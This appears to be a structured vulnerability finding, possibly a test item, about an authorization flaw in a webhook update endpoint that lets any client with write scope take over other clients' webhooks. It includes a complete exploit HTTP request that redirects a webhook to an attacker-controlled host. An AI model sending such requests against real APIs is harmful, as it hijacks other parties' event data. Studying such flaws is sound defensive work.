diagnosis: The endpoint checks that the OAuth2 client has the 'webhooks:write' scope, but updates the webhook record without validating hook.client_id == client.id. Any third-party application with the webhook write scope can redirect webhook event streams belonging to other OAuth clients to an attacker-controlled server.
exploit_request:
PUT /webhooks/wh_live_5502 HTTP/1.1
Host: api.example.com
Authorization: Bearer <scoped_client_token>
Content-Type: application/json

{"destination_url": "https://hijacked.io/hook"}
